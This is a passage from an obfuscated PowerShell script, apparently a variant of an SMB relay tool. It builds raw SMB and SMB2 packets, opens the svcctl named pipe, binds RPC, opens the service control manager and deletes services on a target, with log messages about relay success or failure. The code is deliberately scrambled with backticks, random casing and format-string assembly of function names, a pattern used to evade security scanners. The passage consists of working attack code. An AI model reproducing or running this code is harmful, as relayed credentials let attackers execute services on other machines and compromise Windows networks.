                                    ${iNve`IGh}."L`OG".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service failed to start on $Target "))
                                }

                            }

                            ${p`A`ckET_`SM`B_hEa`DEr} = &("{0}{3}{2}{1}" -f 'Get-PacketSM','ader','He','B') 0x2f 0x18 0x05,0x28 ${smB`_`TReE_ID} ${inv`Ei`gH}."PR`OC`Ess_id_B`yt`Es" ${smb`_`UseR_ID}
                            ${PaCK`et`_`Scm`_daTa} = &("{3}{5}{2}{4}{1}{0}" -f'iceW','erv','MDelete','Get-Pack','S','etSC') ${sMB`_sE`RVi`Ce_`cO`NtExT`_`HAnDle}
                            ${scM_`D`A`TA} = &("{5}{2}{8}{7}{6}{3}{4}{1}{0}"-f 'ictionary','redD','m','t','Orde','ConvertFro','e','ck','-Pa') ${packET`_`Scm_DAtA}
                            ${p`ACKeT`_Rpc_`DATa} = &("{2}{1}{3}{0}{4}" -f 'Re','-Pa','Get','cketRPC','quest') 0x03 ${scm`_`Data}."len`gtH" 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                            ${rpc`_`DatA} = &("{1}{0}{6}{4}{2}{3}{5}"-f'ertFro','Conv','etOr','deredDi','ck','ctionary','m-Pa') ${P`A`C`KET_`RpC_DAta}
                            ${s`mb_`h`eaDEr} = &("{0}{1}{8}{7}{5}{4}{6}{2}{3}" -f'Convert','From-','r','y','deredDict','Or','iona','et','Pack') ${pAcKet_S`mB_`HE`ADER}   
                            ${p`ACK`ET_sM`B`_`dATa} = &("{0}{8}{2}{7}{3}{5}{1}{6}{4}" -f'Ge','ndXR','cket','BWr','uest','iteA','eq','SM','t-Pa') ${S`mb_`Fid} (${rpc_`dA`Ta}."LE`Ng`Th" + ${sCm`_DA`Ta}."lE`NGtH")
                            ${sm`B`_dAta} = &("{9}{3}{8}{0}{5}{2}{6}{7}{1}{4}" -f'P','iona','rde','rt','ry','acketO','redDic','t','From-','Conve') ${PAC`ket_S`mb`_Da`Ta}
                            ${rpc`_Data_L`Ength} = ${sm`B_Da`Ta}."L`En`GtH" + ${s`C`m_daTa}."Len`gTh" + ${R`pc_`D`Ata}."lE`NG`TH"
                            ${pAcKe`T`_`NEt`Bio`S_sESs`IoN_`SERvice} = &("{7}{0}{3}{2}{6}{1}{5}{4}" -f 't-Pac','es','etB','ketN','rvice','sionSe','IOSS','Ge') ${Sm`B`_HE`ADeR}."l`ENG`TH" ${r`pc_Da`T`A_LeNGTH}
                            ${NEtB`IOs`_seSsiOn_`S`ErVICe} = &("{9}{1}{6}{4}{0}{8}{2}{7}{3}{5}"-f '-Packet','F','ere','Dictionar','m','y','ro','d','Ord','Convert') ${pAcKET`_NetB`io`s_sE`s`S`ion_`se`RVice}
                            ${s`mB_c`Lient_s`END} = ${nEtbio`s_`SESS`i`On_sErvicE} + ${Smb_`h`EADer} + ${S`mb`_daTA} + ${Rp`c`_D`ATA} + ${S`Cm`_DAta}
                            ${S`Mb_`cLieN`T_stReam}.("{0}{1}" -f 'W','rite').Invoke(${s`MB_`ClIen`T_SENd},0,${smB`_cLI`enT_`sEnD}."lEn`G`TH")
                            ${s`M`B_C`lient_sTR`eam}.("{0}{1}"-f 'Fl','ush').Invoke()
                            ${SMb_cL`ie`Nt_`S`T`ReAm}.("{0}{1}" -f'R','ead').Invoke(${sm`B`_cLIeNt_r`EceivE},0,${sM`B`_CL`ienT_rEcEiVe}."lEN`g`TH")
                            ${SMb_ClIE`NT_`ST`A`ge} = ("{2}{1}{3}{0}" -f 'uest','adAndXRe','Re','q')
                            ${SM`B_cl`i`ENT_s`TAgE`_NEXt} = ("{0}{4}{2}{1}{3}{5}" -f 'Clos','e','ic','Handl','eServ','e')
                            ${SMb`_cloSe_SeR`VIC`e_hanDle_st`A`GE} = 1
                        }

                        ("{0}{3}{1}{2}{4}" -f'C','oseSe','rvi','l','ceHandle')
                        {

                            if(${sM`B_C`los`e_SERVICE_`h`AnDL`E_StagE} -eq 1)
                            {
                                ${I`NVE`igH}."c`on`s`OlE_Que`UE".("{1}{0}" -f'dd','A').Invoke(('SMB'+' '+'rel'+'ay '+'serv'+'ice '+"$SMB_service "+'del'+'eted'+' '+'o'+'n '+"$Target"))
                                ${SM`B`_cL`osE`_sErViCE_`haN`dle_sT`Age}++
                                ${P`ACk`e`T_`scm_DaTA} = &("{6}{0}{3}{1}{5}{2}{4}"-f'e','cketSC','rviceHandl','t-Pa','e','MCloseSe','G') ${smb`_sE`R`VIce`_c`oNt`eXt_hANdLE}

                                if(${I`NveiGH}."FiL`e_OUtp`Ut")
                                {
                                    ${I`NV`eIGh}."lO`g_F`iLe_QU`EUe".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target "))
                                }

                                if(${i`NVEi`GH}."lOG_ou`Tp`Ut")
                                {
                                    ${invE`IGh}."L`oG".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $Target "))
                                }

                            }
                            else
                            {
                                ${sMB_C`LiEN`T`_sT`AgE} = ("{2}{1}{3}{0}"-f 'st','ose','Cl','Reque')
                                ${PA`CK`et_SCM_D`A`TA} = &("{1}{2}{6}{5}{4}{3}{7}{0}"-f'ndle','Get-Pa','cke','e','ic','MCloseServ','tSC','Ha') ${sMb_`S`ERViCe_`m`AN`AGER`_c`o`NTE`xt_hand`le}
                            }

                            ${p`Ack`ET`_`Smb_Head`eR} = &("{1}{3}{0}{2}{4}{5}{6}"-f'Pack','G','etS','et-','MBHead','e','r') 0x2f 0x18 0x05,0x28 ${s`mB_TRE`e_Id} ${in`VE`IgH}."pRO`Ce`ss`_`Id_BytES" ${SmB_Us`E`R_`ID}
                            ${s`cm_datA} = &("{6}{3}{1}{5}{4}{7}{8}{9}{2}{0}{10}" -f'r','nvertF','tiona','o','m-','ro','C','Pa','cketOrdere','dDic','y') ${paC`ket_`S`c`m_DATA}
                            ${pACKE`T_rpc`_dA`TA} = &("{4}{2}{5}{1}{0}{3}" -f 'PCRequ','acketR','t','est','Ge','-P') 0x03 ${s`cM`_DAta}."leNG`Th" 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                            ${rpc_Da`TA} = &("{3}{5}{6}{1}{4}{0}{2}"-f'edDiction','From-Packe','ary','Con','tOrder','ver','t') ${p`ACKe`T_`RP`c_daTa} 
                            ${SM`B`_He`ADeR} = &("{6}{0}{2}{5}{4}{3}{1}{7}"-f 'From','na','-PacketOrd','io','redDict','e','Convert','ry') ${pac`K`ET_sMb_He`ADEr}   
                            ${PA`ck`Et_SMB_`daTA} = &("{1}{2}{3}{0}{7}{5}{8}{4}{6}"-f'ketSM','Ge','t','-Pac','que','riteAnd','st','BW','XRe') ${SmB_f`iD} (${Rp`C`_Data}."L`ENgTH" + ${S`cm`_`DATa}."lE`Ng`TH")
                            ${sMb_`DA`Ta} = &("{2}{8}{4}{7}{3}{6}{5}{1}{0}" -f 'y','ar','Co','O','tFrom-','on','rderedDicti','Packet','nver') ${PAckeT_sMB_`DA`Ta}
                            ${r`pC_DA`T`A_l`engTh} = ${SmB`_d`ATa}."le`NgtH" + ${S`cM_d`ATA}."l`enGtH" + ${R`Pc_`d`ATa}."l`ENGTH"
                            ${pA`ckeT`_`NetBIo`s_s`ESsIOn_sERvicE} = &("{1}{2}{5}{3}{4}{0}" -f'ice','Ge','t-PacketNe','BIOSSession','Serv','t') ${sMB_hE`AD`ER}."L`EnGth" ${r`Pc_`daT`A`_LEngtH}
                            ${n`eTB`IoS`_`SESs`Ion_`sERvi`cE} = &("{3}{4}{6}{1}{8}{7}{0}{2}{5}" -f 'iction','e','a','Convert','From-P','ry','ack','redD','tOrde') ${PA`c`KET_`Ne`TbI`OS_`SesSION`_Ser`VICE}
                            ${sM`B_cL`ie`Nt_SEnD} = ${N`eT`Bi`OS_SEss`IOn_SE`R`VIcE} + ${sMB`_H`eAd`er} + ${sMb_D`A`Ta} + ${rPC_dA`Ta} + ${Sc`M`_DaTA}
                            ${sMB_`client_`stre`AM}.("{0}{1}"-f 'Wr','ite').Invoke(${smb`_c`lieNt_SEND},0,${Sm`B_Clien`T_s`enD}."len`Gth")
                            ${SM`B_`cL`IEnT_sT`Ream}.("{0}{1}"-f'F','lush').Invoke()
                            ${Sm`B_`ClIent_ST`Ream}.("{1}{0}"-f'ad','Re').Invoke(${Smb_`CL`IEnT`_`REc`EIve},0,${sMB_ClI`e`N`T_r`ECEIVe}."le`N`gth")
                        }

                        ("{1}{0}{2}"-f 'eque','CloseR','st')
                        {
                            ${pAcKE`T_smb_He`A`dER} = &("{3}{1}{2}{0}"-f'etSMBHeader','Pac','k','Get-') 0x04 0x18 0x07,0xc8 ${sM`B_T`REE_ID} ${I`Nv`eiGH}."p`RoC`EsS_`I`D_BYteS" ${SmB_`USE`R_ID}
                            ${Smb_hE`Ad`er} = &("{4}{3}{5}{0}{1}{6}{2}" -f'acketOrdered','Di','ary','om','ConvertFr','-P','ction') ${pa`C`KeT`_S`Mb_`heAdER}   
                            ${pAcKEt`_`smb_`DaTa} = &("{5}{2}{0}{6}{3}{7}{4}{1}"-f'MBClo','st','et-PacketS','e','ue','G','s','Req') 0x00,0x40
                            ${s`Mb_datA} = &("{3}{0}{7}{5}{8}{4}{1}{6}{2}"-f 'rom-P','t','nary','ConvertF','dDic','cke','io','a','tOrdere') ${pAC`K`ET_S`Mb_`DAtA}
                            ${p`A`CKE`T_Ne`TBiOs_S`ESsiON_`s`e`R`VICe} = &("{3}{1}{5}{2}{4}{0}{6}{7}" -f'ionSe','-Packet','B','Get','IOSSess','Net','r','vice') ${sM`B_h`EaDER}."LeN`G`TH" ${Sm`B`_DaTA}."lENG`TH"
                            ${N`Etb`iOS_s`eSsIon_`sErv`iCE} = &("{6}{7}{5}{1}{0}{3}{2}{4}"-f'd','e','ion','Dict','ary','tOrder','ConvertFrom-','Packe') ${paCket_`Ne`TB`i`O`s_ses`SION_SE`R`V`IcE}
                            ${smB`_cl`Ie`Nt_Se`Nd} = ${ne`TbIo`s_SeS`siOn_SeRv`IcE} + ${s`MB_H`ea`DER} + ${s`MB_`DatA}
                            ${S`MB_CLient_ST`RE`Am}.("{1}{0}" -f'te','Wri').Invoke(${SM`B_CLi`ent_Se`Nd},0,${SMB_`ClI`e`N`T_`sEND}."lENG`TH")
                            ${smb`_ClIE`NT`_stReam}.("{1}{0}" -f 'h','Flus').Invoke()
                            ${S`mb_`cl`iENt_`StREam}.("{0}{1}" -f 'R','ead').Invoke(${S`Mb_CLIEnT_`R`ECEiVe},0,${s`M`B_CLienT`_`RE`ceIVE}."le`N`gTH")
                            ${s`MB`_`CLie`NT_STAge} = ("{3}{2}{0}{1}{4}" -f'D','i','ee','Tr','sconnect')
                        }

                        ("{2}{3}{0}{1}" -f'ec','t','T','reeDisconn')
                        {
                            ${packE`T_Smb_H`EAD`ER} = &("{3}{0}{2}{1}"-f'-P','BHeader','acketSM','Get') 0x71 0x18 0x07,0xc8 ${Smb_tre`e_`id} ${in`V`eigH}."P`ROc`ESs_`i`D_ByT`ES" ${sMB`_US`ER_`iD}
                            ${sm`B_`HEaD`Er} = &("{4}{3}{5}{2}{0}{1}" -f'iona','ry','tOrderedDict','-','ConvertFrom','Packe') ${pa`cKEt_SMb_HeA`d`eR}   
                            ${p`A`ck`Et_S`m`B_data} = &("{0}{2}{7}{1}{4}{3}{5}{6}"-f'Get-Packet','isc','SMBTr','nectReq','on','u','est','eeD')
                            ${smb_d`A`Ta} = &("{2}{1}{7}{5}{8}{6}{4}{0}{3}" -f'io','nver','Co','nary','Dict','Fr','dered','t','om-PacketOr') ${paC`KeT_`sMb_`da`Ta}
                            ${P`AcKeT_n`eTbIOS`_S`EsSION_`s`Erv`ICE} = &("{7}{2}{6}{3}{0}{5}{1}{4}"-f 'es','vi','Net','OSS','ce','sionSer','BI','Get-Packet') ${SmB_He`Ad`ER}."len`g`TH" ${smB_d`AtA}."Len`gTh"
                            ${n`ETbIo`S_SE`ss`io`N_SErvICE} = &("{7}{2}{4}{3}{0}{6}{5}{1}" -f 'tO','Dictionary','vertFrom-Pa','ke','c','ed','rder','Con') ${PA`cket_`NEtBiO`S_`sESS`ioN_SErviCE}
                            ${Smb`_clI`ent`_`seNd} = ${NETBIo`S_sessiO`N_`S`e`Rv`icE} + ${SMb_`hE`ADeR} + ${sM`B_d`ATa}
                            ${s`Mb_ClIeNt_`STRE`Am}.("{1}{0}"-f'e','Writ').Invoke(${S`M`B_CLIE`Nt_Se`Nd},0,${Sm`B_cL`IEnT_se`Nd}."L`EN`GTH")
                            ${s`mb_clie`N`T_`str`EaM}.("{0}{1}"-f'Fl','ush').Invoke()
                            ${smb_cLieN`T_S`Tr`eAM}.("{1}{0}" -f'd','Rea').Invoke(${sMb_`ClienT_`R`ecEi`Ve},0,${s`MB`_CliEn`T_RECeIVE}."LEN`GTh")
                            ${SMb_`Cl`I`e`N`T_StaGe} = ("{1}{2}{0}" -f'f','Log','of')
                        }

                        ("{1}{0}"-f'goff','Lo')
                        {
                            ${paCKEt`_smB_`hEAd`Er} = &("{3}{1}{4}{2}{0}"-f 'eader','cke','H','Get-Pa','tSMB') 0x74 0x18 0x07,0xc8 0x34,0xfe ${INV`EI`Gh}."proCes`s_i`D_`BYtes" ${S`m`B_us`eR_id}
                            ${smB_HE`Ad`er} = &("{0}{8}{5}{2}{4}{3}{7}{6}{1}"-f 'C','ionary','tFrom-P','e','acketOrder','er','Dict','d','onv') ${pAc`KEt_SM`B`_Hea`DEr}   
                            ${PackeT`_`SMB_DAtA} = &("{0}{4}{7}{1}{3}{5}{2}{8}{6}" -f'Get-Pa','off','XReq','An','cke','d','st','tSMBLog','ue')
                            ${SMb`_da`TA} = &("{4}{3}{1}{2}{0}{5}{6}" -f 'tOrd','From','-Packe','onvert','C','eredDic','tionary') ${pA`cKE`T_SmB`_Da`TA}
                            ${paCKET_N`ETBIos_`ses`SIO`N`_SE`RviCe} = &("{3}{4}{6}{7}{0}{2}{1}{5}"-f'essi','r','onSe','Get','-Pack','vice','et','NetBIOSS') ${s`mb_HeAD`eR}."len`gTh" ${s`mb_dA`TA}."l`E`NGth"
                            ${n`eT`BIos_Se`Ss`Io`N_seRvIce} = &("{2}{6}{7}{0}{5}{4}{8}{1}{9}{3}" -f'acket','ic','Con','ry','ered','Ord','vertF','rom-P','D','tiona') ${pAc`kE`T_N`etbIOs_seSsIoN_`SER`VI`cE}
                            ${S`Mb_cl`IeN`T_se`ND} = ${NEtb`iOS`_`S`E`SSI`on_SeRvice} + ${SMb`_HE`A`DEr} + ${smB_`Da`TA}
                            ${S`mB_cLIENT_`STr`E`Am}.("{0}{1}" -f'Writ','e').Invoke(${s`MB_`c`LiE`N`T_sENd},0,${smB`_cLIEn`T`_SE`ND}."l`E`NGtH")
                            ${SmB_ClI`E`N`T_s`TrEam}.("{0}{1}"-f'F','lush').Invoke()
                            ${SMB_Cl`IeNT_`stRE`AM}.("{0}{1}"-f'Re','ad').Invoke(${Smb_`clIENt_r`e`ceIvE},0,${SMb_CLIe`NT`_reCe`IvE}."le`NgTH")
                            ${Sm`B_C`lIen`T_s`TAgE} = ("{0}{1}" -f'E','xit')
                        }

                    }
            
                    if(${s`m`B_`RELay_f`AIleD})
                    {
                        ${iN`V`eigH}."c`oNso`L`e_QuEUE".("{1}{0}" -f'd','Ad').Invoke(('SMB'+' '+'r'+'elay '+'failed'+' '+'on'+' '+"$Target"))
                        ${Smb_`CLIe`N`T_StAge} = ("{1}{0}" -f 't','Exi')

                        if(${i`Nv`eiGH}."FI`lE_OutP`UT")
                        {
                            ${in`VEIgH}."LOg_fI`LE`_`q`UEUe".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - SMB relay failed on $Target "))
                        }

                        if(${InV`eiGh}."loG_`Ou`Tput")
                        {
                            ${iN`VEIgh}."l`og".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay failed on $Target "))
                        }

                    }
            
                }

            }  
            else
            {
            
                ${SMb`_`ClIeN`T_sta`ge} = ("{1}{2}{0}{3}"-f'nne','Tre','eCo','ct')

                :SMB_execute_loop while (${s`MB`_clieNt_ST`Age} -ne ("{0}{1}"-f 'exi','t'))
                {

                    switch (${smB_ClIEn`T_`st`AGe})
                    {
            
                        ("{0}{1}{2}{3}" -f'T','ree','C','onnect')
                        {
                            ${S`mB2_ME`sSAge_`id} = 4
                            ${PA`CkE`T_SMb2_`HeAdEr} = &("{6}{4}{5}{3}{2}{0}{1}" -f '2H','eader','B','M','ac','ketS','Get-P') 0x03,0x00 ${sMb2`_M`eS`saGe_ID} ${sMB2_`TREe`_`Id} ${smb_sesSiO`N_`iD}
                            ${paC`keT_`S`mb2`_HeADER}[("{6}{1}{4}{2}{3}{0}{5}" -f 'itRequ','e','Cr','ed','r_','est','SMB2Head')] = 0x7f,0x00
                            ${packEt_SM`B`2`_`daTA} = &("{0}{4}{5}{3}{1}{2}{6}" -f 'Get','C','onnect','ee','-Pa','cketSMB2Tr','Request') ${SMb_P`AT`h`_bYtES}
                            ${s`m`B2_hEAD`er} = &("{2}{3}{4}{0}{1}{5}" -f 'dDic','ti','Conv','ertFrom-PacketOrd','ere','onary') ${P`ACkET_S`mB2_H`EAd`Er}
                            ${sMB`2_dA`TA} = &("{4}{6}{3}{1}{7}{9}{5}{0}{2}{8}" -f 'i','m','onar','vertFro','C','ct','on','-PacketOr','y','deredDi') ${PAC`KEt_`Sm`B2_`DAta}    
                            ${PackET`_`Net`B`iOS_`s`essi`oN_se`Rvi`cE} = &("{0}{2}{5}{3}{1}{4}" -f 'Get-','BIOSSessi','Packet','t','onService','Ne') ${Sm`B2_H`e`ADeR}."l`EngTh" ${sMb2_`D`ATa}."LENg`Th"
                            ${NE`Tbi`O`S_sE`sSI`On_`s`ERVIce} = &("{1}{9}{2}{4}{0}{3}{10}{8}{7}{6}{5}"-f't','C','e','Fr','r','tionary','edDic','der','-PacketOr','onv','om') ${PacKe`T_nETB`IOs`_se`ss`ion_sErvIce}
                            ${sm`B_`cLI`ent_sENd} = ${NEtB`ioS_sE`s`siOn`_SeR`Vi`CE} + ${SM`B2_Hea`dEr} + ${SMB`2_DA`TA}
                            ${sM`B_c`LieNt_`sTReam}.("{0}{1}" -f'Wr','ite').Invoke(${smB_c`lI`e`NT_SENd},0,${Sm`B_`Cl`iEnt_Send}."LENg`TH")
                            ${smb`_c`l`IEn`T_streAm}.("{0}{1}" -f 'Flu','sh').Invoke()
                            ${s`mb_C`LiEnt`_sTre`Am}.("{1}{0}"-f 'ad','Re').Invoke(${sM`B_CLiE`N`T_`REceIve},0,${S`mb`_Cl`IENT_`R`eCeiVe}."LE`N`GTh")
                            ${s`MB`_c`l`IenT_sTA`GE} = ("{1}{0}{2}{3}{4}" -f 'r','C','eateRequ','es','t')
                        }
                  
                        ("{0}{4}{1}{2}{3}"-f 'Cr','teRequ','es','t','ea')
                        {
                            ${sMb2`_tr`eE_iD} = 0x01,0x00,0x00,0x00
                            ${s`MB`_n`A`MEd_`PipE_`BytES} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                            ${SmB2`_mE`Ss`A`ge_id} += 1
                            ${PAcKeT_sM`B`2_`H`EA`DER} = &("{2}{0}{3}{1}"-f 'S','er','Get-Packet','MB2Head') 0x05,0x00 ${smB2_`MesS`A`Ge_iD} ${s`M`B`2_tr`ee_iD} ${sMB`_`seSSIOn`_Id}
                            ${Pack`E`T_Sm`B2_hE`AD`eR}[("{3}{5}{1}{4}{2}{6}{0}" -f 't','edi','q','SM','tRe','B2Header_Cr','ues')] = 0x7f,0x00
                            ${Pac`kET_sm`B2_D`ATa} = &("{1}{4}{5}{3}{0}{6}{2}"-f 'e','Ge','stFile','eR','t-PacketSMB2Cr','eat','que') ${Sm`B_naMeD_pI`P`E`_bytES}
                            ${PaC`kET_`SMb2`_DatA}[("{8}{5}{0}{3}{9}{7}{1}{2}{4}{6}" -f 'at','Share','_Acce','eRe','s','2Cre','s','_','SMB','questFile')] = 0x07,0x00,0x00,0x00  
                            ${SMb`2_HeA`dER} = &("{7}{4}{0}{6}{1}{5}{3}{8}{2}"-f 'F','k','nary','redDic','vert','etOrde','rom-Pac','Con','tio') ${PaC`kEt_`SMb`2_Hea`dER}
                            ${s`Mb2_da`Ta} = &("{9}{5}{0}{10}{2}{7}{6}{3}{4}{1}{8}" -f'r','ctionar','cketOrd','D','i','e','d','ere','y','Conv','tFrom-Pa') ${pACk`e`T_SM`B2_DATA}  
                            ${pACkeT_n`EtBiOS_SE`ssI`o`N_SErVi`CE} = &("{7}{6}{3}{4}{5}{0}{2}{1}" -f'IO','ervice','SSessionS','c','k','etNetB','a','Get-P') ${S`mB2_`HEADer}."Leng`Th" ${SMb`2_D`Ata}."l`E`NGth"
                            ${nE`T`BioS_sE`sSI`on`_SERvI`CE} = &("{7}{5}{3}{1}{6}{4}{2}{0}"-f'ctionary','e','redDi','k','Orde','-Pac','t','ConvertFrom') ${PacKe`T_neTbio`s_Sess`ion`_`SeRvi`Ce}
                            ${SmB`_C`liEnt_`sEnd} = ${N`ET`BIo`s_s`esSiOn_SEr`VI`cE} + ${SmB2_H`e`Ad`ER} + ${SMb`2_`d`Ata}
                            ${sMB_C`l`iE`NT`_`StrEaM}.("{0}{1}" -f 'Wri','te').Invoke(${S`mB`_c`LieN`T_`SEND},0,${Smb`_CLiE`NT_s`end}."len`GTh")
                            ${smB_`ClIEN`T`_S`Tr`EAm}.("{1}{0}"-f 'lush','F').Invoke()
                            ${SmB_cl`ie`NT`_`sTRe`AM}.("{0}{1}" -f 'R','ead').Invoke(${sM`B_cLi`enT_`REc`EivE},0,${sm`B_`ClI`ENt_R`eC`eIve}."LE`N`gTH")
                            ${sMB_CL`iE`NT_`S`T`AgE} = ("{1}{0}"-f'd','RPCBin')
                        }
                
                        ("{2}{1}{0}" -f 'ind','PCB','R')
                        {
                            ${SMb`_`NAm`ed_p`I`pE_bYteS} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                            ${SmB_f`iL`e_id} = ${smB_clI`E`N`T`_ReC`Eive}[132..147]
                            ${SM`B2_`ME`ssAGe_`id} += 1
                            ${pac`ket_`smB2_he`AD`ER} = &("{3}{4}{0}{2}{1}" -f'M','Header','B2','G','et-PacketS') 0x09,0x00 ${SMb2_ME`SSag`e`_ID} ${Smb`2_TrE`E_id} ${sMB_sEssIO`N`_`ID}
                            ${p`AcKEt_sMb2_`hea`D`er}[("{3}{1}{0}{2}{4}"-f'_C','Header','reditRequ','SMB2','est')] = 0x7f,0x00
                            ${Pa`ck`ET`_rpc_dATa} = &("{0}{1}{3}{2}" -f'Get-P','acket','ind','RPCB') 1 0xb8,0x10 0x01 0x00,0x00 ${smb_nA`ME`d`_pIPe_u`UId} 0x02,0x00
                            ${R`pc`_DAta} = &("{3}{1}{4}{5}{8}{7}{0}{6}{2}{9}"-f'r','on','eredD','C','ver','tFrom-','d','ketO','Pac','ictionary') ${p`AcKeT_RpC`_`DaTa} 
                            ${P`Ac`KeT_smb2_dA`Ta} = &("{2}{4}{5}{1}{0}{3}{6}"-f 'eq','WriteR','Get-','ue','Packet','SMB2','st') ${s`mb`_FI`le_iD} ${rpc`_da`TA}."l`engTh"
                            ${smb`2_h`eA`der} = &("{5}{1}{0}{6}{2}{3}{4}" -f 'Packe','m-','rdere','dD','ictionary','ConvertFro','tO') ${P`AckEt`_Smb2_H`eaD`ER}
                            ${S`Mb2_Da`Ta} = &("{1}{2}{7}{6}{5}{4}{0}{3}{8}"-f 'c','Co','nvert','tionar','i','dD','om-PacketOrdere','Fr','y') ${P`AcKeT`_sMb`2_DA`TA} 
                            ${R`pC_D`ATa`_Le`NGtH} = ${sMB2`_`dAta}."l`eng`Th" + ${Rp`C_`dATA}."LENG`Th"
                            ${PACkeT`_net`BIOS_s`ESsio`N_SEr`V`iCE} = &("{5}{0}{1}{4}{2}{6}{3}"-f 'ack','et','Session','ice','NetBIOS','Get-P','Serv') ${s`M`B2_hEADeR}."le`NgtH" ${RPC_`d`AtA_`lengtH}
                            ${N`eTBIOS_`SESSIO`N`_SerVi`Ce} = &("{1}{10}{2}{5}{8}{0}{4}{6}{7}{9}{3}"-f 'Ord','Co','ert','nary','eredDi','From-P','ct','i','acket','o','nv') ${p`ACKEt_nEtB`i`oS_`sessi`ON_`SEr`VIce}
                            ${SMB`_`C`lie`NT`_SEnD} = ${N`ETBI`oS_s`Essi`on`_sErVICE} + ${S`MB`2_`HeADeR} + ${sm`B2_dA`Ta} + ${rpC_D`AtA}
                            ${sMb_cl`iE`NT_st`ReAM}.("{0}{1}" -f 'Wri','te').Invoke(${s`Mb_ClI`En`T_`SeND},0,${smb_cL`IE`NT_`Send}."l`ENGtH")
                            ${SmB_cL`IE`NT_s`Tr`eaM}.("{1}{0}" -f 'sh','Flu').Invoke()
                            ${SM`B_ClI`ent`_STReaM}.("{0}{1}"-f 'Rea','d').Invoke(${SM`B_cl`Ie`NT_rECEiVe},0,${s`Mb_cLieNT_`R`E`ceive}."leng`TH")
                            ${SMB_`Cli`E`Nt_sta`gE} = ("{2}{1}{0}"-f 'quest','adRe','Re')
                            ${S`mb_Cl`IeNT_`s`TA`GE_nEXT} = ("{2}{0}{3}{1}{4}" -f 'SC','anage','Open','M','rW')
                        }
               
                        ("{0}{2}{1}" -f 'ReadR','est','equ')
                        {

                            &("{1}{0}{2}"-f 't-Slee','Star','p') -m 150
                            ${smB`2`_M`eSSAGE`_id} += 1
                            ${PACkET_SMB`2_H`EAD`eR} = &("{1}{3}{2}{0}{4}"-f'etSMB','Get-','ack','P','2Header') 0x08,0x00 ${SMB2_`M`E`s`SaGe_iD} ${SMb2_`TRe`E_ID} ${sMB_`SESsiON`_iD}
                            ${PAcKeT`_S`MB`2_hea`dEr}[("{3}{6}{5}{4}{2}{0}{1}"-f'ditR','equest','re','SMB2Hea','C','r_','de')] = 0x7f,0x00
                            ${PAckET_S`Mb`2`_hEAdeR}[("{1}{0}{2}{3}{4}" -f'MB2Head','S','er_','Credit','Charge')] = 0x10,0x00
                            ${p`ACket_sm`B2_d`ATa} = &("{0}{4}{1}{5}{2}{3}"-f 'Get-','et','ques','t','Pack','SMB2ReadRe') ${s`m`B_fi`le_iD}
                            ${sm`B2_HE`ADeR} = &("{0}{2}{1}{7}{6}{3}{4}{5}{8}" -f 'Co','ve','n','etOrder','edDict','ionar','rom-Pack','rtF','y') ${pACKET_SMB`2_H`E`AD`Er}
                            ${smb2`_Da`Ta} = &("{4}{7}{1}{5}{8}{2}{0}{6}{9}{3}" -f 'rder','om','etO','y','C','-Pac','edDi','onvertFr','k','ctionar') ${PACkET_`Sm`B2`_DatA} 
                            ${PaCKEt_n`EtBi`Os_s`eS`S`i`o`N`_S`erviCE} = &("{7}{0}{2}{4}{5}{8}{6}{1}{3}"-f 'Pa','v','cketN','ice','et','BIOSSess','r','Get-','ionSe') ${sm`B`2_hEAdER}."L`eNgtH" ${s`Mb2`_D`AtA}."lEn`GTH"
                            ${N`ETb`ioS_SE`s`si`O`N_sErVICE} = &("{0}{4}{5}{2}{7}{6}{1}{3}{8}" -f'Con','o','cketO','nar','vertFr','om-Pa','deredDicti','r','y') ${paCket_nE`Tb`ioS_sEsSi`oN_`sERvi`cE}
                            ${sMB_cliEN`T_SE`ND} = ${nE`TBIOS_sE`S`s`iO`N_Se`Rvice} + ${sM`B2_h`E`AdEr} + ${smb`2_da`TA} 
                            ${Smb_`cL`iENt`_St`REam}.("{1}{0}"-f'te','Wri').Invoke(${Sm`B`_`cli`ent_sEnd},0,${sM`B_cL`iE`NT`_seNd}."L`ENG`Th")
                            ${smB`_clI`enT`_s`T`ReaM}.("{0}{1}" -f'F','lush').Invoke()
                            ${SMB`_CliENT`_StrE`Am}.("{1}{0}"-f 'ad','Re').Invoke(${smB_`cL`i`EnT_R`EcEivE},0,${s`M`B`_cl`i`enT_recEIve}."L`eNgth")

                            if( ${w`2EhX}::"ToSTRI`Ng"(${SMB_c`LIENT`_`REc`ei`Ve}[12..15]) -ne ("{1}{0}{2}" -f'0','03-01-','0-00'))
                            {
                                ${s`m`B_CLi`e`Nt_St`Age} = ${smb_cl`I`enT_sTag`E_n`Ext}
                            }
                            else
                            {
                                ${smB_C`LI`eNT_S`TaGE} = ("{2}{0}{1}"-f'sPen','ding','Statu')
                            }

                        }

                        ("{0}{1}{4}{3}{2}"-f'S','tatusP','g','n','endi')
                        {
                            ${S`mB_CLiE`Nt`_s`TReAM}.("{1}{0}" -f'ad','Re').Invoke(${smB_`ClI`eNT_RE`CeI`VE},0,${S`MB_cliEn`T_RE`C`e`IVe}."L`engtH")

                            if(  ${W2`ehx}::"t`o`sTrIng"(${SMb_`cLIENt_Re`cE`IVe}[12..15]) -ne ("{2}{0}{1}"-f'1-0','0-00','03-0'))
                            {
                                ${s`m`B_clIenT_s`TaGe} = ${Smb`_cl`ient_sTa`GE_next}
                            }

                        }
                
                        ("{3}{4}{2}{0}{1}" -f 'SCMa','nagerW','n','O','pe')
                        {
                            ${sm`B`2`_mESSage_iD} = 30
                            ${PaC`ket`_SmB2_`heAder} = &("{6}{1}{3}{0}{2}{5}{4}" -f'2H','ke','e','tSMB','r','ade','Get-Pac') 0x09,0x00 ${sMb2_m`E`ssa`gE_id} ${sM`B`2`_TRe`e_iD} ${SM`B_`sESsI`O`N_id}
                            ${p`ACkE`T`_SMB2`_heAd`er}[("{5}{6}{0}{3}{1}{4}{2}"-f'Head','i','Request','er_Cred','t','S','MB2')] = 0x7f,0x00
